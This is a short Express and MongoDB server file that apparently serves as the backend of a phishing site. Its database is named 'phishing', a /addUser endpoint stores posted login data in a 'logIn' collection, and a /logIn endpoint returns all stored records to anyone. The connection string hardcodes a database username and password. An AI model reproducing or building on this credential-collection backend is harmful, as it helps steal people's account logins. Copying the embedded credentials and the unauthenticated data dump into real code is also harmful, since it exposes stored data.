const express = require('express')
const app = express()
const MongoClient = require('mongodb').MongoClient;
const ObjectID = require('mongodb').ObjectID;
const cors = require('cors')

require('dotenv').config()


const port = process.env.PORT || 5500

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: false }));


app.get('/', (req, res) => {
  res.send('Hello World 123!')
})



const uri = `mongodb+srv://login-user:log1234@cluster0.em86h.mongodb.net/phishing?retryWrites=true&w=majority`;
const client = new MongoClient(uri, { useNewUrlParser: true, useUnifiedTopology: true });
client.connect(err => {
  const userCollection = client.db("phishing").collection("logIn");

  

  app.post('/addUser', (req, res) => {
    const logIn = req.body;
    console.log('adding new Product:', logIn)
    userCollection.insertOne(logIn)
      .then(result => {
        console.log('user', result.insertedCount);
        res.send(result.insertedCount > 0)
      })
  })
  app.get('/logIn', (req, res) => {
    userCollection.find({}).toArray((err, result) => {
      res.send(result)
    })
  })
  // app.get('/admin', (req, res) => {
  //   AdminCollection.find({}).toArray((err, result) => {
  //     res.send(result)
  //   })
  // })


  // client.close();
});



app.listen(port, () => {
  console.log(`Example app listening at http://localhost:${port}`)
})